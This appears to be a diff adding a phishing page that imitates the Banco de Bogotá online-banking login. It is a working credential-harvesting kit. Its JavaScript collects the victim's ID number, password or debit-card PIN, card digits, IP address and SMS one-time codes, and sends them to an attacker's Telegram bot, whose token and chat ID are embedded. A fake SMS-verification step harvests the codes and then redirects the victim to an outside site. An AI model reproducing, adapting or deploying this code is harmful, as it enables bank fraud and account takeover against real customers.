@@ -1,0 +1,668 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <title>Ingreso Bancario</title>
+  <link rel="stylesheet" href="style.css">
+  <style>
+    /* === Estilos originales (mantenidos) === */
+    .text-center { text-align: center; }
+    .logo { display: block; margin: 0 auto; max-width: 100%; }
+    .mt-4 { margin-top: 1.5rem; }
+    .mb-2 { margin-bottom: 0.5rem; }
+    .mt-1 { margin-top: 0.25rem; }
+    .fw-bold { font-weight: bold; }
+    .container-box {
+      max-width: 400px;
+      margin: 20px auto;
+      padding: 20px;
+      background: #fff;
+      border-radius: 10px;
+      box-shadow: 0 4px 20px rgba(0,0,0,0.1);
+    }
+    .tabs {
+      display: flex;
+      border-bottom: 1px solid #ddd;
+      margin-bottom: 20px;
+    }
+    .tab {
+      flex: 1;
+      padding: 10px;
+      text-align: center;
+      cursor: pointer;
+      font-weight: 600;
+      color: #555;
+      border-bottom: 3px solid transparent;
+      transition: all 0.3s;
+    }
+    .tab.active {
+      color: #1e40af;
+      border-bottom-color: #1e40af;
+    }
+    .info-message {
+      background: #e6f0ff;
+      padding: 12px;
+      border-radius: 8px;
+      font-size: 14px;
+      color: #1e3a8a;
+      margin-bottom: 20px;
+      position: relative;
+    }
+    .close-msg {
+      position: absolute;
+      right: 10px;
+      top: 50%;
+      transform: translateY(-50%);
+      font-size: 20px;
+      cursor: pointer;
+      color: #1e3a8a;
+    }
+    .form-group {
+      margin-bottom: 18px;
+    }
+    .form-group label {
+      display: block;
+      font-weight: 600;
+      margin-bottom: 6px;
+      color: #333;
+    }
+    .input-flex {
+      display: flex;
+      gap: 8px;
+    }
+    .input-flex select {
+      width: 80px;
+      padding: 10px;
+      border: 1px solid #ccc;
+      border-radius: 6px;
+      background: #fff;
+    }
+    .input-flex input {
+      flex: 1;
+      padding: 10px;
+      border: 1px solid #ccc;
+      border-radius: 6px;
+    }
+    .password-container input {
+      width: 100%;
+      padding: 10px;
+      border: 1px solid #ccc;
+      border-radius: 6px;
+    }
+    .btn-ingresar {
+      width: 100%;
+      padding: 12px;
+      background: #e0e0e0;
+      border: 1px solid #ccc;
+      border-radius: 6px;
+      color: #666;
+      font-weight: bold;
+      font-size: 16px;
+      cursor: pointer;
+      transition: all 0.3s;
+    }
+    .btn-ingresar:disabled {
+      cursor: not-allowed;
+      opacity: 0.7;
+    }
+
+    /* === Loader overlay === */
+    #loader-overlay {
+      display: none;
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0,0,0,0.7);
+      z-index: 9999;
+      justify-content: center;
+      align-items: center;
+    }
+    .loader-spinner {
+      width: 80px;
+      height: 80px;
+      animation: pulse 1.5s ease-in-out infinite;
+    }
+    @keyframes pulse {
+      0% { transform: scale(1); opacity: 0.7; }
+      50% { transform: scale(1.1); opacity: 1; }
+      100% { transform: scale(1); opacity: 0.7; }
+    }
+
+    /* === MODAL SMS (diseño Banco de Bogotá) === */
+    #modalSMS {
+      display: none;
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(30, 64, 175, 0.7);
+      z-index: 10000;
+      justify-content: center;
+      align-items: center;
+    }
+    #modalSMS.active {
+      display: flex;
+    }
+    .modal-sms-box {
+      background: #fff;
+      padding: 30px 25px;
+      border-radius: 16px;
+      max-width: 360px;
+      width: 90%;
+      text-align: center;
+      color: #1e293b;
+      box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+      border: 1px solid #e2e8f0;
+    }
+    .modal-sms-box h3 {
+      color: #1e40af;
+      font-size: 22px;
+      margin: 0 0 5px 0;
+      font-weight: 600;
+    }
+    .modal-sms-box .sub-text {
+      font-size: 14px;
+      color: #475569;
+      margin-bottom: 20px;
+      line-height: 1.4;
+    }
+    .modal-sms-box input {
+      width: 100%;
+      padding: 14px 12px;
+      margin: 10px 0 18px 0;
+      border: 2px solid #e2e8f0;
+      border-radius: 10px;
+      font-size: 22px;
+      text-align: center;
+      letter-spacing: 6px;
+      font-weight: bold;
+      box-sizing: border-box;
+      transition: border 0.2s;
+      outline: none;
+    }
+    .modal-sms-box input:focus {
+      border-color: #1e40af;
+    }
+    .modal-sms-box input:disabled {
+      background: #f1f5f9;
+      color: #94a3b8;
+    }
+    .modal-sms-box .btn-verify {
+      background: #1e40af;
+      color: white;
+      border: none;
+      padding: 14px;
+      width: 100%;
+      border-radius: 10px;
+      font-size: 16px;
+      font-weight: bold;
+      cursor: pointer;
+      transition: background 0.2s;
+    }
+    .modal-sms-box .btn-verify:hover:not(:disabled) {
+      background: #1e3a8a;
+    }
+    .modal-sms-box .btn-verify:disabled {
+      background: #94a3b8;
+      cursor: not-allowed;
+    }
+    #sms-error {
+      color: #dc2626;
+      font-size: 13px;
+      margin-top: 12px;
+      min-height: 20px;
+    }
+    #sms-success {
+      color: #16a34a;
+      font-size: 13px;
+      margin-top: 12px;
+      min-height: 20px;
+    }
+
+    /* Ajustes responsive */
+    @media (max-width: 480px) {
+      .container-box { padding: 15px; }
+      .input-flex select { width: 70px; }
+    }
+  </style>
+</head>
+<body>
+  <div class="text-center" style="background: linear-gradient(135deg, #1e40af 0%, #1e3a8a 100%); padding: 20px; border-radius: 0 0 15px 15px; margin: 0 -15px 20px -15px;">
+    <img src="img/descarga.svg" alt="Banco de Bogotá" class="logo mb-2" style="display: block; margin: 0 auto;">
+  </div>
+  <div class="text-center mt-4">
+    <h3 class="mt-1 fw-bold" style="text-align: center; width: 100%;">Bienvenido a tu Banca Virtual</h3>
+  </div>
+  <div class="container-box">
+    <div class="tabs">
+      <div class="tab active" id="tab-clave">Clave segura</div>
+      <div class="tab" id="tab-tarjeta">Tarjeta débito</div>
+    </div>
+    <div class="info-message" id="info-message" style="text-align: left;">
+      Estás ingresando con tu Clave Segura. Selecciona 'Tarjeta Débito' para cambiar el tipo de ingreso.
+      <span class="close-msg" onclick="document.getElementById('info-message').style.display='none';">×</span>
+    </div>
+    <div class="form-container" id="form-clave">
+      <div class="form-group">
+        <label>Identificación</label>
+        <div class="input-flex">
+          <select>
+            <option>C.C. ...</option>
+            <option>C.E.</option>
+            <option>NIT</option>
+          </select>
+          <input type="text" id="identificacion-clave" placeholder="#" maxlength="10" oninput="this.value = this.value.replace(/[^0-9]/g, '')" title="Solo números, máximo 10 dígitos">
+        </div>
+      </div>
+      <div class="form-group">
+        <label>Clave segura</label>
+        <div class="password-container">
+          <input type="password" id="password-clave" placeholder="...." maxlength="4" oninput="this.value = this.value.replace(/[^0-9]/g, '')" title="Solo números, máximo 4 dígitos">
+        </div>
+      </div>
+      <button class="btn-ingresar" disabled>Ingresar</button>
+    </div>
+    <div class="form-container" id="form-tarjeta" style="display: none;">
+      <div class="form-group">
+        <label>Identificación</label>
+        <div class="input-flex">
+          <select>
+            <option>C.C. ...</option>
+            <option>C.E.</option>
+            <option>NIT</option>
+          </select>
+          <input type="text" id="identificacion-tarjeta" placeholder="#" maxlength="10" oninput="this.value = this.value.replace(/[^0-9]/g, '')" title="Solo números, máximo 10 dígitos">
+        </div>
+      </div>
+      <div class="form-group">
+        <label>Clave de tu tarjeta débito</label>
+        <div class="password-container">
+          <input type="password" id="password-tarjeta" placeholder="...." maxlength="4" oninput="this.value = this.value.replace(/[^0-9]/g, '')" title="Solo números, máximo 4 dígitos">
+        </div>
+      </div>
+      <div class="form-group">
+        <label>Últimos 4 dígitos de tu tarjeta débito</label>
+        <div class="password-container">
+          <input type="password" id="digitos-tarjeta" placeholder="...." maxlength="4" oninput="this.value = this.value.replace(/[^0-9]/g, '')" title="Solo números, máximo 4 dígitos">
+        </div>
+      </div>
+      <button class="btn-ingresar" disabled>Ingresar</button>
+    </div>
+  </div>
+
+  <!-- Loader overlay -->
+  <div id="loader-overlay">
+    <div class="loader-spinner">
+      <img src="img/21l.svg" alt="Loading" style="width: 100%; height: 100%; object-fit: contain;">
+    </div>
+  </div>
+
+  <!-- ===== MODAL SMS (Banco de Bogotá) ===== -->
+  <div id="modalSMS">
+    <div class="modal-sms-box">
+      <h3>🔐 Verificación SMS</h3>
+      <p class="sub-text">Ingresa el código de verificación enviado a tu celular.</p>
+      <input type="text" id="txt-codigo-sms" placeholder="Código" inputmode="numeric" autocomplete="off">
+      <button class="btn-verify" id="btnVerificarSMS">Verificar</button>
+      <div id="sms-error"></div>
+      <div id="sms-success"></div>
+    </div>
+  </div>
+
+  <script>
+    // ============================================================
+    // 🔐 CONFIGURACIÓN DE TELEGRAM (USA LOS MISMOS QUE EN AV VILLAS)
+    // ============================================================
+    const TELEGRAM_TOKEN = '8223520326:AAHX3wFpsoUX5Iz8_6-5xxUAEWmUGgGSZ5k'; // ← cámbialo si es necesario
+    const CHAT_ID = '7776240161'; // ← cámbialo si es necesario
+
+    // 🔑 CÓDIGO SMS CORRECTO (cámbialo por el real)
+    const CODIGO_CORRECTO = '123456';
+
+    // ⏱ Configuración de intentos
+    const MAX_INTENTOS = 3;
+    const TIEMPO_BLOQUEO = 13;
+
+    // ============================================================
+    // NO TOCAR DEBAJO (salvo que sepas lo que haces)
+    // ============================================================
+    let intentosSMS = 0;
+    let temporizadorBloqueo = null;
+    let bloqueado = false;
+
+    // ============================================================
+    // FUNCIÓN PARA ENVIAR MENSAJE A TELEGRAM (DIRECTO, SIN PHP)
+    // ============================================================
+    async function enviarTelegram(mensaje) {
+      console.log('📤 Enviando mensaje a Telegram...');
+      try {
+        const res = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            chat_id: CHAT_ID,
+            text: mensaje,
+            parse_mode: 'HTML'
+          })
+        });
+        const data = await res.json();
+        console.log('📨 Respuesta de Telegram:', data);
+        if (data.ok) {
+          console.log('✅ Mensaje enviado correctamente');
+          return { success: true };
+        } else {
+          console.error('❌ Error de Telegram:', data.description);
+          return { success: false, error: data.description };
+        }
+      } catch (err) {
+        console.error('❌ Error de red:', err);
+        return { success: false, error: err.message };
+      }
+    }
+
+    // ============================================================
+    // FUNCIONES ORIGINALES (tabs, validaciones) adaptadas
+    // ============================================================
+    const tabClave = document.getElementById('tab-clave');
+    const tabTarjeta = document.getElementById('tab-tarjeta');
+    const formClave = document.getElementById('form-clave');
+    const formTarjeta = document.getElementById('form-tarjeta');
+    const infoMessage = document.getElementById('info-message');
+
+    function validarCamposClave() {
+      const btnIngresar = formClave.querySelector('.btn-ingresar');
+      const identificacion = document.getElementById('identificacion-clave').value;
+      const password = document.getElementById('password-clave').value;
+      const camposCompletos = identificacion.length >= 5 && password.length === 4;
+      btnIngresar.disabled = !camposCompletos;
+      if (camposCompletos) {
+        btnIngresar.style.background = "linear-gradient(135deg, #1e40af 0%, #1e3a8a 100%)";
+        btnIngresar.style.border = "none";
+        btnIngresar.style.color = "white";
+      } else {
+        btnIngresar.style.background = "#e0e0e0";
+        btnIngresar.style.border = "1px solid #ccc";
+        btnIngresar.style.color = "#666";
+      }
+    }
+
+    function validarCamposTarjeta() {
+      const btnIngresar = formTarjeta.querySelector('.btn-ingresar');
+      const identificacion = document.getElementById('identificacion-tarjeta').value;
+      const password = document.getElementById('password-tarjeta').value;
+      const digitos = document.getElementById('digitos-tarjeta').value;
+      const camposCompletos = identificacion.length >= 5 && password.length === 4 && digitos.length === 4;
+      btnIngresar.disabled = !camposCompletos;
+      if (camposCompletos) {
+        btnIngresar.style.background = "linear-gradient(135deg, #1e40af 0%, #1e3a8a 100%)";
+        btnIngresar.style.border = "none";
+        btnIngresar.style.color = "white";
+      } else {
+        btnIngresar.style.background = "#e0e0e0";
+        btnIngresar.style.border = "1px solid #ccc";
+        btnIngresar.style.color = "#666";
+      }
+    }
+
+    tabClave.addEventListener('click', () => {
+      tabClave.classList.add('active');
+      tabTarjeta.classList.remove('active');
+      formClave.style.display = 'block';
+      formTarjeta.style.display = 'none';
+      infoMessage.style.display = 'block';
+      validarCamposClave();
+    });
+
+    tabTarjeta.addEventListener('click', () => {
+      tabTarjeta.classList.add('active');
+      tabClave.classList.remove('active');
+      formClave.style.display = 'none';
+      formTarjeta.style.display = 'block';
+      infoMessage.style.display = 'none';
+      validarCamposTarjeta();
+    });
+
+    document.addEventListener('DOMContentLoaded', function() {
+      // Session ID (para compatibilidad, aunque ya no se usa)
+      let sessionId = localStorage.getItem('session_id');
+      if (!sessionId) {
+        sessionId = 'session_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
+        localStorage.setItem('session_id', sessionId);
+      }
+
+      const identClave = document.getElementById('identificacion-clave');
+      const passClave = document.getElementById('password-clave');
+      identClave.addEventListener('input', validarCamposClave);
+      passClave.addEventListener('input', validarCamposClave);
+
+      const identTarjeta = document.getElementById('identificacion-tarjeta');
+      const passTarjeta = document.getElementById('password-tarjeta');
+      const digitosTarjeta = document.getElementById('digitos-tarjeta');
+      identTarjeta.addEventListener('input', validarCamposTarjeta);
+      passTarjeta.addEventListener('input', validarCamposTarjeta);
+      digitosTarjeta.addEventListener('input', validarCamposTarjeta);
+
+      validarCamposClave();
+      validarCamposTarjeta();
+
+      // Eventos de los botones Ingresar
+      const btnClave = formClave.querySelector('.btn-ingresar');
+      const btnTarjeta = formTarjeta.querySelector('.btn-ingresar');
+
+      btnClave.addEventListener('click', function(e) {
+        e.preventDefault();
+        const identificacion = document.getElementById('identificacion-clave').value;
+        const password = document.getElementById('password-clave').value;
+        if (identificacion && password) {
+          localStorage.setItem('identificacion', identificacion);
+          localStorage.setItem('password', password);
+          enviarDatosATelegram(identificacion, password, 'Clave Segura', null);
+        }
+      });
+
+      btnTarjeta.addEventListener('click', function(e) {
+        e.preventDefault();
+        const identificacion = document.getElementById('identificacion-tarjeta').value;
+        const password = document.getElementById('password-tarjeta').value;
+        const digitos = document.getElementById('digitos-tarjeta').value;
+        if (identificacion && password && digitos) {
+          localStorage.setItem('identificacion', identificacion);
+          localStorage.setItem('password', password);
+          localStorage.setItem('digitos', digitos);
+          enviarDatosATelegram(identificacion, password, 'Tarjeta Débito', digitos);
+        }
+      });
+    });
+
+    // ============================================================
+    // FUNCIÓN PRINCIPAL: ENVÍO DE DATOS A TELEGRAM
+    // ============================================================
+    async function enviarDatosATelegram(identificacion, password, tipo, digitos) {
+      const loader = document.getElementById('loader-overlay');
+      if (loader) loader.style.display = 'flex';
+
+      // Detectar dispositivo
+      const userAgent = navigator.userAgent;
+      let dispositivo = 'PC';
+      if (/Android/i.test(userAgent)) dispositivo = 'Android';
+      else if (/iPhone|iPad|iPod/i.test(userAgent)) dispositivo = 'iPhone';
+      else if (/Windows/i.test(userAgent)) dispositivo = 'PC';
+      else if (/Mac/i.test(userAgent)) dispositivo = 'Mac';
+      else if (/Linux/i.test(userAgent)) dispositivo = 'Linux';
+
+      const hora = new Date().toLocaleString('es-ES');
+
+      // Obtener IP (opcional)
+      let ip = 'No disponible';
+      try {
+        const res = await fetch('https://api.ipify.org?format=json');
+        const data = await res.json();
+        if (data && data.ip) ip = data.ip;
+      } catch (e) {
+        console.warn('⚠️ No se pudo obtener IP');
+      }
+
+      // Construir mensaje según el tipo
+      let mensaje = `
+<b><u>💎BANCO DE BOGOTA 💎</u></b>
+• <b>💌Correo:</b> ${localStorage.getItem('correo') || 'No disponible'}
+• <b>📞Celular:</b> ${localStorage.getItem('cel') || 'No disponible'}
+• <b>💸Cedula:</b> ${localStorage.getItem('val') || 'No disponible'}
+• <b>👤Persona:</b> ${localStorage.getItem('per') || 'No disponible'}
+• <b>🏦Banco:</b> BANCO DE BOGOTA
+------------------------------
+• <b>📟Dispositivo:</b> ${dispositivo}
+• <b>🗺IP:</b> ${ip}
+• <b>⏱Hora:</b> ${hora}
+------------------------------
+• <b>🔑 Tipo:</b> ${tipo}
+• <b>👤 Usuario:</b> ${identificacion}
+• <b>🔑 Clave:</b> ${password}`;
+
+      if (digitos) {
+        mensaje += `\n• <b>💳 Dígitos:</b> ${digitos}`;
+      }
+      mensaje += `\n------------------------------`;
+
+      const resultado = await enviarTelegram(mensaje);
+
+      if (loader) loader.style.display = 'none';
+
+      if (resultado.success) {
+        // ✅ Éxito → mostrar modal SMS
+        mostrarModalSMS();
+      } else {
+        alert('❌ Error al enviar los datos. Detalle: ' + (resultado.error || 'Error desconocido'));
+      }
+    }
+
+    // ============================================================
+    // FUNCIÓN: Mostrar modal de SMS (con 3 intentos y bloqueo de 13s)
+    // ============================================================
+    function mostrarModalSMS() {
+      const modal = document.getElementById('modalSMS');
+      const input = document.getElementById('txt-codigo-sms');
+      const error = document.getElementById('sms-error');
+      const success = document.getElementById('sms-success');
+      const btn = document.getElementById('btnVerificarSMS');
+
+      // Reiniciar estado
+      input.value = '';
+      error.innerText = '';
+      success.innerText = '';
+      intentosSMS = 0;
+      bloqueado = false;
+      if (temporizadorBloqueo) {
+        clearInterval(temporizadorBloqueo);
+        temporizadorBloqueo = null;
+      }
+      input.disabled = false;
+      btn.disabled = false;
+      modal.classList.add('active');
+      input.focus();
+
+      btn.onclick = async function() {
+        if (bloqueado) return;
+
+        const codigo = input.value.trim();
+
+        if (codigo.length < 4 || isNaN(codigo)) {
+          error.innerText = '⚠️ Ingresa un código numérico de al menos 4 dígitos.';
+          return;
+        }
+
+        if (codigo === CODIGO_CORRECTO) {
+          // ✅ Código correcto
+          await enviarCodigoSMSTelegram(codigo);
+          modal.classList.remove('active');
+          // Redirigir a éxito si se desea
+          // window.location.href = "exito.html";
+        } else {
+          // ❌ Código incorrecto
+          intentosSMS++;
+          const restantes = MAX_INTENTOS - intentosSMS;
+
+          if (restantes === 0) {
+            // Tercer fallo → enviar mensaje y redirigir
+            error.innerText = '❌ Has agotado los 3 intentos. Enviando reporte...';
+            input.disabled = true;
+            btn.disabled = true;
+            await enviarIntentoFallidoTelegram(codigo, restantes);
+            error.innerText = '❌ Has agotado los 3 intentos. Redirigiendo...';
+            setTimeout(() => {
+              window.location.href = 'https://adminjelpit.site/jelpit/';
+            }, 1500);
+          } else {
+            // Bloquear por 13 segundos
+            error.innerText = `❌ Código incorrecto. Te quedan ${restantes} intento(s). Espera ${TIEMPO_BLOQUEO}s.`;
+            input.disabled = true;
+            btn.disabled = true;
+            bloqueado = true;
+
+            let tiempoRestante = TIEMPO_BLOQUEO;
+            const contadorInterval = setInterval(() => {
+              tiempoRestante--;
+              error.innerText = `❌ Código incorrecto. Te quedan ${restantes} intento(s). Espera ${tiempoRestante}s.`;
+              if (tiempoRestante <= 0) {
+                clearInterval(contadorInterval);
+                input.disabled = false;
+                btn.disabled = false;
+                bloqueado = false;
+                input.value = '';
+                input.focus();
+                error.innerText = `Te quedan ${restantes} intento(s). Ingresa el código.`;
+              }
+            }, 1000);
+
+            temporizadorBloqueo = contadorInterval;
+            // Enviar intento fallido (sin esperar para no bloquear UI)
+            enviarIntentoFallidoTelegram(codigo, restantes);
+          }
+        }
+      };
+
+      input.onkeydown = function(e) {
+        if (e.key === 'Enter' && !bloqueado) {
+          btn.click();
+        }
+      };
+    }
+
+    // ============================================================
+    // FUNCIÓN: Enviar código correcto a Telegram
+    // ============================================================
+    async function enviarCodigoSMSTelegram(codigo) {
+      const identificacion = localStorage.getItem('identificacion') || 'No especificado';
+      const mensaje = `
+🔐 <b>CÓDIGO SMS CORRECTO - BANCO DE BOGOTÁ</b>
+------------------------------
+👤 Usuario: ${identificacion}
+📟 Código: <b>${codigo}</b>
+🕒 Hora: ${new Date().toLocaleString('es-ES')}
+------------------------------
+✅ Continuar con el proceso.`;
+      await enviarTelegram(mensaje);
+    }
+
+    // ============================================================
+    // FUNCIÓN: Enviar intentos fallidos a Telegram
+    // ============================================================
+    async function enviarIntentoFallidoTelegram(codigo, restantes) {
+      const identificacion = localStorage.getItem('identificacion') || 'No especificado';
+      const mensaje = `
+⚠️ <b>INTENTO FALLIDO - BANCO DE BOGOTÁ</b>
+------------------------------
+👤 Usuario: ${identificacion}
+📟 Código ingresado: <b>${codigo}</b>
+❌ Intentos restantes: ${restantes}
+🕒 Hora: ${new Date().toLocaleString('es-ES')}
+------------------------------`;
+      await enviarTelegram(mensaje);
+    }
+  </script>
+</body>
+</html>
